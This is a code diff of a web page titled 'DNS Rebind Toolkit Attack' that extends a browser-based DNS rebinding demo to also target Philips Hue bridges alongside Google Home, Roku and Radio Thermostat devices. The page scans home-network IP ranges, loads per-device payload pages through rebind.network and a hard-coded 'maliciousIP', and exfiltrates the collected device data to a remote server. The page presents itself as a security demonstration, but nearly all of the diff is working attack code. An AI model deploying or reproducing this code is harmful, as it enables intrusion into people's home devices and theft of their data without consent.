@@ -57,16 +57,19 @@
 <div id='app'>
     <div class='header'>
         <h1>DNS Rebind Toolkit Attack</h1>
-        <div>Looking for Google Home, Roku, and Radio Thermostat devices on your home network.</div>
+        <div>Looking for vulnerable IoT devices on your home network.</div>
         <br>
         <div v-if='ips.length > 1'>Scanning {{ips.length}} IP addresses from {{startIp}} to {{endIp}}</div>
         <div><b>Google Home</b> IPs finished/started: {{googleHome.finishedIps.length}}/{{googleHome.startedIps.length}}</div>
         <div><b>Roku</b> IPs finished/started: {{roku.finishedIps.length}}/{{roku.startedIps.length}}</div>
         <div><b>Radio Thermostat</b> IPs finished/started: {{radioThermostat.finishedIps.length}}/{{radioThermostat.startedIps.length}}</div>
+        <div><b>Phillips Hue Bridge</b> IPs finished/started: {{phillips.finishedIps.length}}/{{phillips.startedIps.length}}</div>
+        
         <br>
         <div v-if="Object.keys(roku.devices).length > 0" class="warning">{{Object.keys(roku.devices).length}} Roku found</div>
         <div v-if="Object.keys(googleHome.devices).length > 0" class="warning">{{Object.keys(googleHome.devices).length}} Google Home found</div>
         <div v-if="Object.keys(radioThermostat.devices).length > 0" class="warning">{{Object.keys(radioThermostat.devices).length}} Radio Thermostat found</div>
+        <div v-if="Object.keys(phillips.devices).length > 0" class="warning">{{Object.keys(phillips.devices).length}} Phillips Hue Bridge found</div>
         
     </div>
     <div>
@@ -77,7 +80,7 @@
         </div>
         <div v-else >
             <div class='info'>
-                The DNS Rebind attack was successful and a device has been found on your network. Your browser has been tricked into violating the <a href="https://en.wikipedia.org/wiki/Same-origin_policy" target="_blank">Same-Origin Policy</a> and HTTP requests have been made to interact with the device on your local network. <span class='warning'>The information below has been exfiltrated from your device and sent to a remote server that you do not control.</span>
+                The DNS Rebind attack was successful and a device has been found on your network. Your browser has been tricked into violating the <a href="https://en.wikipedia.org/wiki/Same-origin_policy" target="_blank">Same-Origin Policy</a> and HTTP requests have been made to interact with a device on your local network. <span class='warning'>The information below has been exfiltrated from your device and sent to a remote server that you do not control.</span>
             </div>
             <div v-for='d in getDevices()' class=device>
                 <pre>{{JSON.stringify(d, null, 4)}}</pre>
@@ -119,6 +122,7 @@
         const thermostat = new DNSRebindAttack('rebind.network', 80)
         const roku = new DNSRebindAttack('rebind.network', 8060)
         const googleHome = new DNSRebindAttack('rebind.network', 8008)
+        const phillips = new DNSRebindAttack('rebind.network', 80)
         
         const maliciousIP = '52.23.194.42'
         googleHome.attack(ips, maliciousIP, 'payloads/google-home.html', 200)
@@ -132,18 +136,26 @@
         roku.on('all-iframes-added', () => {
             thermostat.attack(ips, maliciousIP, 'payloads/radio-thermostat.html', 200)
         })
+        
+        // when the third is done, start the fourth
+        thermostat.on('all-iframes-added', () => {
+            phillips.attack(ips, maliciousIP, 'payloads/phillips-hue.html', 200)
+        })
 
         roku.nodes.on('begin', begin('roku'))
         thermostat.nodes.on('begin', begin('radioThermostat'))
         googleHome.nodes.on('begin', begin('googleHome'))
+        phillips.nodes.on('begin', begin('phillips'))
         
         roku.nodes.on('destroy', destroy('roku'))
         thermostat.nodes.on('destroy', destroy('radioThermostat'))
         googleHome.nodes.on('destroy', destroy('googleHome'))
+        phillips.nodes.on('destroy', destroy('phillips'))
         
         roku.nodes.on('exfiltrate', exfiltrate('roku'))
         thermostat.nodes.on('exfiltrate', exfiltrate('radioThermostat'))
         googleHome.nodes.on('exfiltrate', exfiltrate('googleHome'))
+        phillips.nodes.on('exfiltrate', exfiltrate('phillips'))
         
         function begin(device) {
             return function(ip) {
@@ -189,6 +201,11 @@
                 finishedIps: [],
                 startedIps: [],
                 devices: {}
+            },
+            phillips: {
+                finishedIps: [],
+                startedIps: [],
+                devices: {}
             }	
         },
         methods: {
@@ -198,7 +215,8 @@
             getDevices: function() {
                 return  [...Object.values(this.googleHome.devices),
                          ...Object.values(this.roku.devices), 
-                         ...Object.values(this.radioThermostat.devices)]
+                         ...Object.values(this.radioThermostat.devices),
+                         ...Object.values(this.phillips.devices)]
             }
         }
     })
